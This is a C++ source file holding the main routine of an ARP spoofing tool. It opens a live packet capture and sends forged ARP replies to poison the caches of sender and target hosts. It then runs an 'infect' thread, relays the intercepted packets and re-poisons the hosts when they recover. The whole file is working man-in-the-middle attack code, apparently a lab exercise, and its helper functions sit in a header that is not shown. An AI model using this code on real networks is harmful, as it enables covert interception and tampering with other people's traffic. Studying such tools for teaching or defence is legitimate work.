#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <string>
#include <pthread.h>
#include "arp-spoof.h"

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    const char* dev = argv[1];

    if (!getMyInfo(dev)) {
        fprintf(stderr, "[-] Failed to get my MAC/IP\n");
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "[-] Couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);
        Mac senderMac;
        Mac targetMac;

        if (!getMac(pcap, senderMac, senderIp)) {
            fprintf(stderr, "[-] Failed to get sender MAC for %s\n", std::string(senderIp).c_str());
            continue;
        }

        if (!getMac(pcap, targetMac, targetIp)) {
            fprintf(stderr, "[-] Failed to get target MAC\n");
            continue;
        }

        SpoofPair spoofpair;
        spoofpair.senderIp = senderIp;
        spoofpair.targetIp = targetIp;
        spoofpair.senderMac = senderMac;
        spoofpair.targetMac = targetMac;

        if (!sendArpSpoof(spoofpair)) {
            fprintf(stderr, "[-] Failed to send ARP spoof packet\n");
            continue;
        }

        spoofpairs.push_back(spoofpair);
    }

    printf("[+] Ready to relay packets\n");

    pthread_t tid;
    pthread_create(&tid, nullptr, infectThread, nullptr);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        relayPacket(packet, header->caplen);
        detectRecoverAndReinfect(packet, header->caplen);
    }

    pcap_close(pcap);
}
